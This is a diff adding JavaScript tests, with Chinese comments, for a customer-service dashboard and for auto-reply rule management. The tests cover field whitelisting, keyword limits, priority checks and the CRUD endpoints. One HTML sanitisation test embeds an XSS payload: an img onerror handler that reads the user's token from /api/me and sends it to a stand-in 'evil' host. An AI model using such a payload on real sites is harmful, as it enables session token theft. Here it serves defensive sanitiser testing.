+  '中位数一起给：平均值会被一个隔夜才回的会话彻底带偏，而那种会话每天都有一两个')
+assert(swBoard.queued_now === 1,
+  '排队中的会话数是「现在」的事实：没人回的会话正在积压时，一个按 30 天平均的数字看起来完全正常')
+const swBoardQ = swBoardDb.calls.find(c => c.table === 'cs_sessions')
+assert(swBoardQ.gte?.created_at, '按建立时间截取区间')
+assert(swBoardQ.limit === 5000, '有上限，不把全部历史拉进内存')
+assert(Date.parse(swBoard.since) > swNow - 8 * 86400000 && Date.parse(swBoard.since) <= swNow,
+  'days=7 的区间起点在七天内')
+const swClamp = (await sxDashboard(recorder({ cs_sessions: { data: [], error: null } }), swAdmin, { days: 9999 })).body
+assert(swClamp.days === 365, 'days 夹到 365')
+const swZero = (await sxDashboard(recorder({ cs_sessions: { data: [], error: null } }), swAdmin, { days: 0 })).body
+assert(swZero.days === 30, 'days=0 回落到 30，不是查零天')
+assert((await sxDashboard(recorder({}), swCs, {})).status === 403, '客服看不到看板')
+const swEmptyBoard = (await sxDashboard(recorder({ cs_sessions: { data: [], error: null } }), swAdmin, {})).body
+assert(swEmptyBoard.overall.total === 0 && swEmptyBoard.overall.reply_rate === 0,
+  '没有会话时给 0，不是 NaN——NaN 在界面上渲染成空白，看起来像加载失败')
+
+console.log('CS workbench: OK')
+// --- §3 自动回复规则管理 --------------------------------------------------------------------------
+// 这些规则的正文会发给每一个开会话的用户，所以它是一个「一次配置、全站可见」的写入口。校验松一点的
+// 代价不是一条坏数据，而是每个新会话都收到那条坏数据。
+const arId = '13131313-1313-4313-8313-131313131313'
+const arAuth = { userId: 'admin-3', group: 'admin' }
+const arBase = {
+  id: arId, name: '退款说明', enabled: true, trigger: 'keyword', channel: 'both',
+  keywords: ['退款'], match_mode: 'contains', body: '退款请在订单页提交申请。', format: 'plain',
+  once_per_session: true, priority: 10, created_by: 'admin-3'
+}
+
+// 服务端决定的列不接受请求里的值。created_by 尤其重要：允许改的话，一条规则可以被伪造成别人建的，
+// 而那正是出问题时第一个要查的字段。
+assert(SX_RULE_NEVER.includes('created_by') && SX_RULE_NEVER.includes('id'),
+  'created_by 和 id 不可写')
+const arForgeDb = recorder({ cs_auto_replies: [{ data: arBase, error: null }, { data: arBase, error: null }] })
+await sxUpdateRule(arForgeDb, arId, { id: 'forged', created_by: 'someone-else',
+  created_at: '1999-01-01', updated_at: '1999-01-01', name: '改个名' })
+const arForged = arForgeDb.calls.find(c => c.table === 'cs_auto_replies' && c.op === 'update').payload
+for (const key of ['id', 'created_by', 'created_at']) {
+  assert(!(key in arForged), `${key} 不能进 update 的载荷——允许改的话，一条规则可以被伪造成别人建的`)
+}
+// updated_at 也在 NEVER_WRITABLE 里，但它和上面三个不同：服务端自己要写它。这里要的是「请求体里的
+// 值不作数」，不是「这个键不出现」——写成后者的话，那次断言会逼着把时间戳的维护删掉。
+assert(arForged.updated_at && arForged.updated_at !== '1999-01-01',
+  'updated_at 由服务端生成，请求体里的值不作数')
+assert(Date.parse(arForged.updated_at) > Date.now() - 60_000, 'updated_at 是此刻，不是请求里带来的旧值')
+// validateRule 只从已知字段构造输出，所以未知字段自然落不进去——但这一条要钉住，
+// 因为把它改成 { ...input } 是一次看起来无害的「简化」。
+const arUnknown = sxValidateRule({ trigger: 'session_open', body: '你好', evil: 1, created_by: 'x' })
+assert(arUnknown.ok && !('evil' in arUnknown.value) && !('created_by' in arUnknown.value),
+  '未知字段不透传：这个函数是白名单，不是过滤器')
+
+// 新建时 trigger 必填。缺它的规则不知道什么时候该发，落库之后是一条永不触发的死规则。
+assert(sxValidateRule({ body: '你好' }).ok === false, 'trigger 必填')
+assert(sxValidateRule({ trigger: 'nope', body: '你好' }).ok === false, 'trigger 只能是三种之一')
+assert(sxValidateRule({ trigger: 'session_open', body: '你好' }).ok === true, '会话开启触发不需要关键词')
+// 关键词触发必须有关键词：一条 keywords 为空的 keyword 规则在 matchesKeyword 里永远不匹配，
+// 于是它安静地什么都不做，而配的人以为自己配好了。
+assert(sxValidateRule({ trigger: 'keyword', keywords: [], body: '你好' }).ok === false,
+  '关键词触发必须至少配一个关键词')
+assert(sxValidateRule({ trigger: 'keyword', body: '你好' }).ok === false, '连 keywords 字段都没有同样要拒')
+assert(sxValidateRule({ trigger: 'keyword', keywords: ['退款'], body: '你好' }).ok === true, '有关键词就行')
+assert(sxValidateRule({ trigger: 'session_open', body: '   ' }).ok === false, '正文不能是空白')
+assert(sxValidateRule({ trigger: 'session_open' }).ok === false, '正文必填')
+
+// 关键词的归一化。
+const arKw = sxValidateRule({ trigger: 'keyword', keywords: ['退款', '退款', ' 退款 ', '', '  ', null, '发票'], body: 'x' })
+assert(arKw.ok && arKw.value.keywords.length === 2,
+  '去重且去掉空串——空串在 contains 模式下匹配任何文本，等于让这条规则对每句话都触发')
+assert(arKw.value.keywords.includes('退款') && arKw.value.keywords.includes('发票'), '前后空格要 trim')
+assert(sxValidateRule({ trigger: 'keyword', keywords: 'x', body: 'y' }).ok === false, 'keywords 必须是数组')
+assert(sxValidateRule({ trigger: 'keyword', keywords: ['x'.repeat(101)], body: 'y' }).ok === false,
+  '单个关键词有长度上限')
+assert(sxValidateRule({ trigger: 'keyword', keywords: Array.from({ length: 51 }, (_, i) => `k${i}`), body: 'y' }).ok === false,
+  '关键词最多 50 个——一条规则配上几千个词，每条用户消息都要跑一遍那个循环')
+assert(sxValidateRule({ trigger: 'keyword', keywords: Array.from({ length: 60 }, () => '同一个词'), body: 'y' })
+  .value.keywords.length === 1, '上限是去重之后算的：六十个同样的词只是一个词')
+
+assert(sxValidateRule({ trigger: 'session_open', body: 'x'.repeat(4001) }).ok === false, '正文有长度上限')
+assert(sxValidateRule({ trigger: 'session_open', body: 'x', match_mode: 'nope' }).ok === false, 'match_mode 要在名单里')
+assert(sxValidateRule({ trigger: 'session_open', body: 'x', format: 'nope' }).ok === false, 'format 要在名单里')
+for (const p of [1.5, 'abc', 1001, -1001, NaN]) {
+  assert(sxValidateRule({ trigger: 'session_open', body: 'x', priority: p }).ok === false,
+    `priority ${p} 应拒——优先级决定同时命中时发哪条，一个 NaN 会让排序结果不可预测`)
+}
+assert(sxValidateRule({ trigger: 'session_open', body: 'x', priority: 0 }).ok === true, 'priority 可以是 0')
+assert(sxValidateRule({ trigger: 'session_open', body: 'x', priority: -1000 }).ok === true, '下界可取')
+
+// html 格式的正文进来就清洗，和用户发的消息同一套规则。「管理员不会写恶意 HTML」不是一个能依赖的
+// 前提：被盗的管理员账号第一件能做的事，就是往每个新会话里投一段脚本。
+const arHtml = sxValidateRule({ trigger: 'session_open', format: 'html',
+  body: '<b>你好</b><img src=x onerror="fetch(`/api/me`).then(r=>r.json()).then(d=>fetch(`//evil/`+d.token))">' })
+assert(arHtml.ok && arHtml.value.body.includes('<b>') && !/onerror/i.test(arHtml.value.body),
+  'html 正文落库前就清洗掉事件属性')
+assert(!/script/i.test(sxValidateRule({ trigger: 'session_open', format: 'html', body: '<script>x</script>a' }).value.body),
+  'script 标签同样清掉')
+// 非 html 的不能被清洗：markdown 里的 <b> 是字面文本，清掉就改了管理员写的内容。
+const arMd = sxValidateRule({ trigger: 'session_open', format: 'markdown', body: '用 <b> 可以加粗' })
+assert(arMd.value.body === '用 <b> 可以加粗', 'markdown 正文原样存，清洗只对 html 生效')
+assert(sxValidateRule({ enabled: false }, { partial: true }).ok === true, 'partial 只改一个开关是合法的')
+assert(sxValidateRule({}, { partial: true }).ok === false, '空 patch 要拒，不能发一条什么都不改的 update')
+
+// 新建：created_by 来自 auth，不是请求体。
+const arCreateDb = recorder({ cs_auto_replies: { data: arBase, error: null } })
+const arCreated = await sxCreateRule(arCreateDb, arAuth,
+  { trigger: 'keyword', keywords: ['退款'], body: '退款请在订单页提交申请。', created_by: 'forged' })
+assert(arCreated.status === 201, '合法规则可以建')
+const arIns = arCreateDb.calls.find(c => c.table === 'cs_auto_replies' && c.op === 'insert').payload
+assert(arIns.created_by === 'admin-3', 'created_by 取自 auth，请求体里的伪造值不作数')
+const arRejectDb = recorder({})
+assert((await sxCreateRule(arRejectDb, arAuth, { body: 'x' })).status === 400, '不合法的直接 400')
+assert(!arRejectDb.tables.includes('cs_auto_replies'), '校验没过就不该碰表')
+
+// 改：跨字段校验要拿现有行补齐。只改 trigger 为 keyword 而不带 keywords 的请求，光看请求体是合法的，
+// 看完整状态才知道它会造出一条永不触发的规则。
+assert((await sxUpdateRule(recorder({}), 'not-a-uuid', { name: 'x' })).status === 400, 'id 要过 UUID 校验')
+assert((await sxUpdateRule(recorder({ cs_auto_replies: { data: null, error: null } }), arId, { name: 'x' })).status === 404,
+  '规则不存在给 404')
+const arNoKw = await sxUpdateRule(
+  recorder({ cs_auto_replies: { data: { ...arBase, trigger: 'session_open', keywords: [] }, error: null } }),
+  arId, { trigger: 'keyword' })
+assert(arNoKw.status === 400 && /关键词/.test(arNoKw.body.error),
+  '把 trigger 改成 keyword 而现有行没有关键词，要拒——否则那条规则从此安静地什么都不做')
+const arHasKw = recorder({ cs_auto_replies: [{ data: arBase, error: null }, { data: arBase, error: null }] })
+assert((await sxUpdateRule(arHasKw, arId, { trigger: 'keyword' })).status === 200,
+  '现有行已经有关键词，只改 trigger 是合法的')
+const arClearKw = await sxUpdateRule(recorder({ cs_auto_replies: { data: arBase, error: null } }),
+  arId, { keywords: [] })
+assert(arClearKw.status === 400, '把一条 keyword 规则的关键词清空同样要拒（合并后的状态才是判断依据）')
+const arClearBody = await sxUpdateRule(recorder({ cs_auto_replies: { data: arBase, error: null } }),
+  arId, { body: '   ' })
+assert(arClearBody.status === 400, '正文清空要拒：一条空正文的规则会发出一条空消息')
+const arUpdDb = recorder({ cs_auto_replies: [{ data: arBase, error: null }, { data: { ...arBase, name: '新名字' }, error: null }] })
+const arUpd = await sxUpdateRule(arUpdDb, arId, { name: '新名字' })
+assert(arUpd.status === 200 && arUpd.body.rule.name === '新名字', '改名成功并回新行')
+const arUpdCall = arUpdDb.calls.find(c => c.table === 'cs_auto_replies' && c.op === 'update')
+assert(arUpdCall.filters.id === arId, 'update 必须带 id 条件——漏掉就是把全部规则改成同一条')
+assert(arUpdCall.payload.updated_at, '刷 updated_at：规则列表要能看出哪条最近被动过')
+
+// 删：改成 enabled=false 是另一件事，两者都要有。
+assert((await sxDeleteRule(recorder({}), 'nope')).status === 400, '删也要过 UUID 校验')
+assert((await sxDeleteRule(recorder({ cs_auto_replies: { data: null, error: null } }), arId)).status === 404,
+  '删不存在的规则给 404，不是假装成功')
+const arDelDb = recorder({ cs_auto_replies: { data: { id: arId }, error: null } })
+const arDel = await sxDeleteRule(arDelDb, arId)
+assert(arDel.status === 200 && arDel.body.deleted === arId, '删成功回被删的 id')
+const arDelCall = arDelDb.calls.find(c => c.op === 'delete')
+assert(arDelCall.filters.id === arId, "delete 必须带 id 条件——漏掉它是一句删空整张表的调用")
+
+// 列表：三段排序。同优先级时按建立时间正序，好让管理员看到的顺序和 pickAutoReply 的选择一致——
+// 两边不一致的表现是「界面上排第一的那条没有生效」。
+const arListDb = recorder({ cs_auto_replies: { data: [arBase], error: null } })
+const arList = await sxListRules(arListDb, {})
+assert(arList.status === 200 && arList.body.rules.length === 1, '列表能读')
+const arOrders = arListDb.calls.find(c => c.table === 'cs_auto_replies').orders
+assert(arOrders.length === 3, '三段排序：先按触发方式分组，再按优先级倒序，最后按建立时间正序')
+assert(arOrders[0].col === 'trigger' && arOrders[1].col === 'priority' && arOrders[1].ascending === false &&
+  arOrders[2].col === 'created_at' && arOrders[2].ascending === true, '三段的顺序和方向')
+const arFiltered = recorder({ cs_auto_replies: { data: [], error: null } })
+await sxListRules(arFiltered, { trigger: 'keyword', enabled: false })
+const arFq = arFiltered.calls.find(c => c.table === 'cs_auto_replies')
+assert(arFq.filters.trigger === 'keyword', 'trigger 筛选落到 SQL')
+assert(arFq.filters.enabled === false,
+  'enabled=false 要能筛——用 if (input.enabled) 判断的话，「只看停用的」这个筛选永远筛不出东西')
+const arBadFilter = recorder({ cs_auto_replies: { data: [], error: null } })
+await sxListRules(arBadFilter, { trigger: 'nope' })
+assert(!('trigger' in arBadFilter.calls.find(c => c.table === 'cs_auto_replies').filters),
+  '不认识的 trigger 值忽略，不原样拼进查询')
+
+console.log('CS auto-reply rules: OK')
+
